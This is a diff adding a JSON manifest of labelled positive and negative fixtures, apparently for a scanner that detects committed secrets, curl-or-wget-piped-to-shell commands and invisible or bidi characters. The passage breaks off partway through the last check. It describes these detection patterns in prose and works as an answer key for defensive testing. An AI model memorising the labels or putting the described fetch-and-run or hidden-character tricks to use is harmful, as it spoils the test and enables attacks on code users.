@@ -1,0 +1,3205 @@
+{
+ "fixtures": [
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos01",
+   "label": "positive",
+   "property": "The file scripts/deploy.sh is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "6eb14d9e78afef5710ea0727c55dc47a09d719c8caf0e26af169cc4f8d86565c",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos02",
+   "label": "positive",
+   "property": "The file config/settings.py is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "f2d7f222f09e760da7dd60c8166f1b825a8e6f9cc063895348b6ebecf988acba",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos03",
+   "label": "positive",
+   "property": "The file ops/release.yml is outside any test, example, docs, sample, fixture or mock location and holds a GitHub token on a line that has no placeholder wording.",
+   "sha256": "7793446d06b68f0529f8a24024aa011d71cee201b114fc9694d2c156c503ab1a",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos04",
+   "label": "positive",
+   "property": "The file src/notify.js is outside any test, example, docs, sample, fixture or mock location and holds a Slack token on a line that has no placeholder wording.",
+   "sha256": "1b7b89538872e82ede0e41df6265eba0ffdbb3aa102f3a53a76fd13ced0316b1",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos05",
+   "label": "positive",
+   "property": "The file src/maps.ts is outside any test, example, docs, sample, fixture or mock location and holds a Google API key on a line that has no placeholder wording.",
+   "sha256": "348ab9ab18ac15a772fb28f140f469499713ef7e8230886dc40e95a96305357c",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos06",
+   "label": "positive",
+   "property": "The file billing/config.rb is outside any test, example, docs, sample, fixture or mock location and holds a payment-provider live key on a line that has no placeholder wording.",
+   "sha256": "4399230288850d3cf6683577dd6fa50218b6de72952fc490275b5f4e9d69a378",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos07",
+   "label": "positive",
+   "property": "The file deploy/id_rsa.pem is outside any test, example, docs, sample, fixture or mock location and holds a private-key block header on a line that has no placeholder wording.",
+   "sha256": "f8d56af7d5fc76a549fb7aaa867da025e229cc7f7c03adffc87b70c9f57fd572",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos08",
+   "label": "positive",
+   "property": "The file README.md is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "04ea0ec68126d48331b23fb5d0e453651f9b0ec7adf9e163b0211301277e7a28",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos09",
+   "label": "positive",
+   "property": "The file config/prod.env is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "0faa6c766bb50b5e7abc9f4e7da108663468b7b684d5e6b410366e5e12047b21",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos10",
+   "label": "positive",
+   "property": "The file package.json is outside any test, example, docs, sample, fixture or mock location and holds a GitHub token on a line that has no placeholder wording.",
+   "sha256": "686958f41d3dd5364e0640570ba2915a033f1a2fbd1d837299276812d73e1400",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos11",
+   "label": "positive",
+   "property": "The file cmd/server/main.go is outside any test, example, docs, sample, fixture or mock location and holds a payment-provider live key on a line that has no placeholder wording.",
+   "sha256": "9913c80fd196598bfb6826895f2b3ccc7673895f805679d404227255c78ea923",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos12",
+   "label": "positive",
+   "property": "The file config/chat.toml is outside any test, example, docs, sample, fixture or mock location and holds a Slack token on a line that has no placeholder wording.",
+   "sha256": "5bf352b65e6e78e2330e4e06fc516e95382ecb712c2c847710c66dbb93ff6e68",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos13",
+   "label": "positive",
+   "property": "The file src/backup.py is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "c1e1a13cebacc739071218e3feaeb22c8d94ff4ef00d247f30b2cf92f62589e4",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos14",
+   "label": "positive",
+   "property": "The file src/big_module.py is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "5e58b6eab9906a3e6e31cbbce0b8760c4121c438ad7090cf65cc5a7c2f0515cd",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos15",
+   "label": "positive",
+   "property": "The file web/index.html is outside any test, example, docs, sample, fixture or mock location and holds a Google API key on a line that has no placeholder wording.",
+   "sha256": "965de2ccc98962c64b0b50bba9a587e6fb04511e56593c9e78eb0fc710ff9b1a",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos16",
+   "label": "positive",
+   "property": "The file config/ci.ini is outside any test, example, docs, sample, fixture or mock location and holds a GitHub token on a line that has no placeholder wording.",
+   "sha256": "350a777eda4907b0c4a880c657e63dc6ec80a7ddfe19508b1cadffc336ffa9a7",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos17",
+   "label": "positive",
+   "property": "The file Dockerfile is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "676acbce1246fc69ffc88ba1b5e503b6ab46e694cd1af5a317d4590a6ee5d9be",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos18",
+   "label": "positive",
+   "property": "The file scripts/setup.sh is outside any test, example, docs, sample, fixture or mock location and holds a private-key block header on a line that has no placeholder wording.",
+   "sha256": "9b2ef71ff5f560a8a468dd8b1e4fce1566fab3b1dac165e6d301554810112d48",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos19",
+   "label": "positive",
+   "property": "The file src/billing.py is outside any test, example, docs, sample, fixture or mock location and holds a payment-provider key-mode key on a line that has no placeholder wording.",
+   "sha256": "a2a64c8f5f84c494a96ec17346c6aeb858db121e1d884a62804e1d76c6cf80ee",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-pos20",
+   "label": "positive",
+   "property": "The file tools/legacy/backup.sh is outside any test, example, docs, sample, fixture or mock location and holds a cloud access key on a line that has no placeholder wording.",
+   "sha256": "22a083c8f9544bef848e6edab356d2b86186597b0cae9b9c25b5858c0c32b807",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg01",
+   "label": "negative",
+   "property": "The only strings with a credential shape sit under tests/.",
+   "sha256": "27617638a2aa4ee6b13db5b14b5d69e05d3d6e7d0d6435c40c5c714d0c7d2eb2",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg02",
+   "label": "negative",
+   "property": "The only strings with a credential shape sit under examples/.",
+   "sha256": "f8c417fad55dde09a21db797cef5f0b2aa46a30bdf9bf24c62bcdbd17db0f8bc",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg03",
+   "label": "negative",
+   "property": "The only string with a credential shape sits in docs/setup.md.",
+   "sha256": "d5fd2744e748201f37e29fb8a0b46d763b6989000a6ea1bfdb5f1bdec04548e8",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg04",
+   "label": "negative",
+   "property": "The credential-shaped string is on a line that calls it an example value.",
+   "sha256": "1a43ed5c62e164531b41e182a28a6be092dbe72f7eaeb0cac65dd1937b1eb13f",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg05",
+   "label": "negative",
+   "property": "The credential-shaped string is on a line that calls it a placeholder.",
+   "sha256": "bdf92db9ac210f3d22c9b51e5bacfe1e56ee364850c4376787c90a4cffac9c66",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg06",
+   "label": "negative",
+   "property": "The code reads the key from an environment variable; no value is written in any file.",
+   "sha256": "b1a3c353a1be74ca8d27a13633278098267f36bcb7c4bc7eecf8e84b13c43270",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg07",
+   "label": "negative",
+   "property": "A string starts like a cloud access key but has only four characters after the prefix.",
+   "sha256": "3a2d3ad214ec58e8c0754a1d778c1e5bfb18dd46f1813523db71a3ae07af208f",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg08",
+   "label": "negative",
+   "property": "The only long opaque strings are 40-character hex digests in a lockfile.",
+   "sha256": "029e802a3917c9fbdaffa022dc5ac19a2bfb69d182b757a96f1ce2c12858d5be",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg09",
+   "label": "negative",
+   "property": "The credential-shaped string sits under fixtures/.",
+   "sha256": "f77cb4627fafc4ec6b48d59fbe76bc524979e6efd5d64d93229e589b8d2d769f",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg10",
+   "label": "negative",
+   "property": "The credential-shaped string sits under mocks/.",
+   "sha256": "6b769a726d989b95a1965f1bb3c4d067c04f07c38c6856e5d73bd2cc81896892",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg11",
+   "label": "negative",
+   "property": "The credential-shaped string sits in a file named client.mock.js.",
+   "sha256": "5885ff17decc828a871e4f503c17a2e3f7a6c70d0fd7d90c982072a3e39fdc9a",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg12",
+   "label": "negative",
+   "property": "The credential-shaped string sits in a file named auth.spec.ts.",
+   "sha256": "d77bebd32b6364969aa880d28ad7442239ac87c965bda7d5f933eb8b8b91b1ab",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg13",
+   "label": "negative",
+   "property": "The PEM file holds a public key block, not a private one.",
+   "sha256": "ff3d21a5c00fa12133544ef6249c1b477d4732973fe202de79da375648b7bbda",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg14",
+   "label": "negative",
+   "property": "The credential-shaped string sits under demo/.",
+   "sha256": "eedbf25492d877360dc67f631d51df1dc694f0ef95da617cc279db09ccbe9cdf",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg15",
+   "label": "negative",
+   "property": "The credential-shaped string is on a line that calls it synthetic.",
+   "sha256": "3750cd9d0b49ab51ab162882b92994222c58d246de38a658f3bbe423b0021a61",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg16",
+   "label": "negative",
+   "property": "The workflow refers to the key by its secret name; no value is written.",
+   "sha256": "20d1d0376156c3acfb5dc96a0940e07c3048c6b0952830f23c1236e3a7536c3c",
+   "split": "dev"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg17",
+   "label": "negative",
+   "property": "A password assignment holds a short word, not a credential-shaped string.",
+   "sha256": "04ef883e88ab53ebdba621591050c023edd8fac4f71bd9c96a738c3ae18f1baf",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg18",
+   "label": "negative",
+   "property": "The source holds a regular expression that describes the key shape, with no key.",
+   "sha256": "5bdcf16a13aef24d2fc6298518ad5ac7d3dd1cfb4e8fcb27b7995215f93ef9c7",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg19",
+   "label": "negative",
+   "property": "The credential-shaped string sits under samples/.",
+   "sha256": "3cf607deac185591d8e00fd9348bcc373e751838f4a9596a83b6007b6ceaa6e0",
+   "split": "test"
+  },
+  {
+   "check": "secret-in-tree",
+   "id": "secret-in-tree-neg20",
+   "label": "negative",
+   "property": "The only string is in lowercase, which is not the shape of a cloud access key.",
+   "sha256": "c9c9cac20b2537f69ee79081b6cf1207b61c18b3d366c88cc49363917a4d9ec9",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos01",
+   "label": "positive",
+   "property": "The file README.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "5f87d367fea76c692479e62dd43b67eafc08b9d3116684a46d08bdf54256e401",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos02",
+   "label": "positive",
+   "property": "The file README.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "b025c26208f0a2d4cd8995b66aba365b26edf9a01cba51c4e784d20bca814f09",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos03",
+   "label": "positive",
+   "property": "The file INSTALL.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "9bacd54fc4cb619f7ba71b852ce11aa5c7f50bba9bd7a5a6fdc3d89d5030aff2",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos04",
+   "label": "positive",
+   "property": "The file scripts/bootstrap.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "ea32ca3e73435e79eae49eae38e356e976c3287a81e88fba7f9c0c0953879f56",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos05",
+   "label": "positive",
+   "property": "The file scripts/install.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "e193d063fea0dc5f7a0f49fe1d99ee465619718870ac8372f9294b17aa0178c8",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos06",
+   "label": "positive",
+   "property": "The file scripts/update.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "3e45e5943a43d083a76bc79f6b64f69bff104b39ed840d78620000c4cc087798",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos07",
+   "label": "positive",
+   "property": "The file docs/GETTING-STARTED.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "eebf2164dcec4a6db44591431b45948db9c463986f486382d13a4733967c295f",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos08",
+   "label": "positive",
+   "property": "The file install.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "8d467d9c20e58ab3bccbf429d9ba5500c5d900219eafcf1ffe385d18cd2eb9c7",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos09",
+   "label": "positive",
+   "property": "The file tools/setup-env.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "fd5f0bb7bb44fb3182633252b0b682a5877895ce8085c972b5eada2194e30feb",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos10",
+   "label": "positive",
+   "property": "The file README.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "c830068d4f37dceb3049126025660dd29558bad7029d03c40c5b3c575c07ec2f",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos11",
+   "label": "positive",
+   "property": "The file scripts/ci-prepare.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "368946e99c3739f46c84c6d988de62ccb7cc605db9a4bbe0e5a02a9025aba3f7",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos12",
+   "label": "positive",
+   "property": "The file docs/macos.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "e1a6abeb25d70d44734f29f59ef35b93fdcb1cd7994c8fcff3ce7af042f17af8",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos13",
+   "label": "positive",
+   "property": "The file scripts/get-deps.zsh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "37d649465461f5fa9c1454a5c7646ddf4d132d0c736777ea6dca71f74c086680",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos14",
+   "label": "positive",
+   "property": "The file CONTRIBUTING.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "92880d3acf095d5b9c5a9c59675a4d0886d9d735dbe643e3888702c421bb79ae",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos15",
+   "label": "positive",
+   "property": "The file bin/setup.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "626baf6fe8f4204b463c598bedfc0ed9f6fad346fe0cdb1c29127416f26f036a",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos16",
+   "label": "positive",
+   "property": "The file README.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "51a239ba8a75cedd4c949911938d9188480687405046664e63b2bf7f96a2f3e2",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos17",
+   "label": "positive",
+   "property": "The file .github/workflows/prepare.yml holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "ce9523aa5a23ca0714c2a109045a94b05b92468d0727ffbd376af88d7f7caf66",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos18",
+   "label": "positive",
+   "property": "The file scripts/setup.py holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "39167829ea162c9fad51718605f52dce97449e6c2aa194552a3dab50813d6350",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos19",
+   "label": "positive",
+   "property": "The file docs/windows.md holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "fd90dc05d17eaa6edfd15f20a4872300a98bf1667746e2436ff12e0d7e7dc9f7",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-pos20",
+   "label": "positive",
+   "property": "The file scripts/toolchain.sh holds a command that downloads with curl or wget and pipes the output into a shell.",
+   "sha256": "8bbcff0ad0729a64c21ca68eb3ed54c119442e391a7485c51a2deaffd1a93177",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg01",
+   "label": "negative",
+   "property": "A download is piped into tar, not into a shell.",
+   "sha256": "6d11324b5e3ff0644da29817ab0a88bee43e66887b42f6bd775efb4129e7cd90",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg02",
+   "label": "negative",
+   "property": "A download is piped into a JSON pretty printer.",
+   "sha256": "9e54a7932d288f3c912af3c338358a882f5956a5f2567312cb44a7849f8fe8cd",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg03",
+   "label": "negative",
+   "property": "A download is piped into a checksum program, not a shell.",
+   "sha256": "4737ce8b5338d5c2c22df16c575cd6b65ad1d25aee2de10839eaaf922240ecbe",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg04",
+   "label": "negative",
+   "property": "A script is downloaded to a file, checked against a digest, and run only afterwards.",
+   "sha256": "9f538eb3a6c26ddfae8f0e94aea368982c668f1e79e5469fde78343744aea583",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg05",
+   "label": "negative",
+   "property": "The README tells readers never to pipe a download into a shell and shows no such command.",
+   "sha256": "848b6b02dff67ebd33357ee51e850b007d18e400b2f12f4e95cc93c4fe3a6e6b",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg06",
+   "label": "negative",
+   "property": "The command sits under tests/ as a string to check against.",
+   "sha256": "a60c3b47e77c0f6d075dac87c4336765000158db420b67cc04fdbd09fe0f7de8",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg07",
+   "label": "negative",
+   "property": "A download is written to a file with a redirect.",
+   "sha256": "79a5e3d3b89782db6e26f2b7f1f016d9e85d4dbccbcf3c52c75cd026bed98797",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg08",
+   "label": "negative",
+   "property": "A mirror download is piped into tar and then no shell runs.",
+   "sha256": "4b0d4765b7168d68469a46c87722d48833443fb257febc5231acebffd380f196",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg09",
+   "label": "negative",
+   "property": "A local file is piped into a shell and nothing is downloaded.",
+   "sha256": "9b46a8635a33f6298a5deb91c1c022515a751dd596c68d0956150b78921e4ba5",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg10",
+   "label": "negative",
+   "property": "The README says to download the installer from the releases page and read it first.",
+   "sha256": "19f3c8473f0638139664a1bf73010c30756f0fa51d6e7eb01cdbec11b732946d",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg11",
+   "label": "negative",
+   "property": "A denylist file lists the pipe-to-shell pattern as a string to refuse.",
+   "sha256": "7e038a57ec48afc45d111ef381ed5f7a564f7fd1d13db033b68951f33f9d2575",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg12",
+   "label": "negative",
+   "property": "A download is piped into a pager.",
+   "sha256": "56d4d9a07b8900225568b02f9379c6a2f7146b6b0001493b964d47cba2e9c471",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg13",
+   "label": "negative",
+   "property": "A download is piped into a shell linter, which reads but does not run it.",
+   "sha256": "8ff2955e6e849b60eac91b5f8fda6489aee8c82164f57f0869d237746290bffe",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg14",
+   "label": "negative",
+   "property": "A download is piped into grep.",
+   "sha256": "ed96009cf0c7602d1b9a23307882a945b82013ca94abb51b4dd8ad898d97dbad",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg15",
+   "label": "negative",
+   "property": "The shell script uses the package manager to install, with no download pipe.",
+   "sha256": "b63c1411352451b5c4b3338248e14a55d0a2799ecc148815e3335adea9dbdf55",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg16",
+   "label": "negative",
+   "property": "A pipe-to-shell command appears only as a quoted example inside a document about attacks.",
+   "sha256": "08bf51e18385014f1da9f095a27ef1f00339d23451d8f0669d98990e3bac66ef",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg17",
+   "label": "negative",
+   "property": "A download is verified with a signature and then installed with the package tool.",
+   "sha256": "f69310d259f83ec66dca9592de34834f05cde6b0e1d619d4cada95fbca0b31ff",
+   "split": "test"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg18",
+   "label": "negative",
+   "property": "An echo of a shell pipeline that does not download.",
+   "sha256": "959d525d7a7bb428f0d3b6f276fee3636d3f07bf0b04769be400f3765837c91f",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg19",
+   "label": "negative",
+   "property": "A download is piped into a script interpreter other than a shell, Python reading JSON.",
+   "sha256": "6d003e534ad8e7dd66fa6ecf9db415064e77560e30f0d326e3e0dcf73e4a6249",
+   "split": "dev"
+  },
+  {
+   "check": "curl-pipe-shell",
+   "id": "curl-pipe-shell-neg20",
+   "label": "negative",
+   "property": "A download is piped into gunzip and written to a file.",
+   "sha256": "74391a6923991334ca1a7ceda9958976ced7789d30ed67f76c4cfdccc4ab152f",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos01",
+   "label": "positive",
+   "property": "The file src/run.py contains the invisible character U+200B inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "e399b5e31f9bdf35e50900ba61a6319295f5361896f08ae0add37510741965d7",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos02",
+   "label": "positive",
+   "property": "The file README.md contains the invisible character U+200B inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "b31229c744eff26018c76beac430a28fa2f638affbcf0ab0958bc6b82c6dc5ad",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos03",
+   "label": "positive",
+   "property": "The file src/access.js contains the invisible character U+202E inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "f3e7eea243c781286f66aa02dd22de7cbb5ca97be880e74e1886002f1a16c3f7",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos04",
+   "label": "positive",
+   "property": "The file src/names.go contains the invisible character U+202A inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "5d873cb0e6c82729eb5b90b1f6fb30af867d024e08ab5e7c3a9216d23a270e04",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos05",
+   "label": "positive",
+   "property": "The file docs/notes.md contains the invisible character U+202D inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "c9cb959ca34b5c6645712bc49477bf2b6e22ed3f879569198fe56e8649e262cb",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos06",
+   "label": "positive",
+   "property": "The file src/config.py contains the invisible character U+2060 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "801f22876351e91fd95900489010094888ac564c695eaee696288432e343089b",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos07",
+   "label": "positive",
+   "property": "The file scripts/build.sh contains the invisible character U+2062 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "3f7125c032db04d8b970c094c29d0cb3605a9445c094d692ab66a354be28b9fb",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos08",
+   "label": "positive",
+   "property": "The file src/tokens.ts contains the invisible character U+2063 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "9f0c3b3ad548f29e26b59bdc1cdcea62ea8edaf5972a594752932925d2858ccb",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos09",
+   "label": "positive",
+   "property": "The file src/path.rb contains the invisible character U+2066 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "8d986a9979db9a58e27fcbcc49e870f7aa91453a03638b6639dcace43a525511",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos10",
+   "label": "positive",
+   "property": "The file config/app.toml contains the invisible character U+2069 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "29fff0494285634cf9730f8c1e7bf48c8b099f8c806ab92c3b0a576a90de909b",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos11",
+   "label": "positive",
+   "property": "The file README.md contains the invisible character U+E0041 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "3cd596e40c0bcf358bcad0127152fe4c9901af82f6503276c391587f6fd50d77",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos12",
+   "label": "positive",
+   "property": "The file docs/usage.md contains the invisible character U+E0020 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "daec6fcac70526b9faa9871a38477aa28a71a1fbfa8adae76fcdc0eb29e2d3f5",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos13",
+   "label": "positive",
+   "property": "The file config/rules.yml contains the invisible character U+200B inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "bdbee316fa93cbccc76a8ead82b4546ecfc72112970b815a5bf194488c059b36",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos14",
+   "label": "positive",
+   "property": "The file src/lib.rs contains the invisible character U+2064 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "7bfbb3d86076a9bf8d7f8d848e5afb2839d25d466ccf7985b26947544569d3d0",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos15",
+   "label": "positive",
+   "property": "The file package.json contains the invisible character U+200B inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "54c7c86621ef9a85a1e057f6e7658a2f528d5d2dc10a99816c25f7fbab759a3d",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos16",
+   "label": "positive",
+   "property": "The file src/main.py contains the invisible character U+202B inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "9283348076021bed7a289cadf5391c52824b29545ba90cd317765e51530c3cd6",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
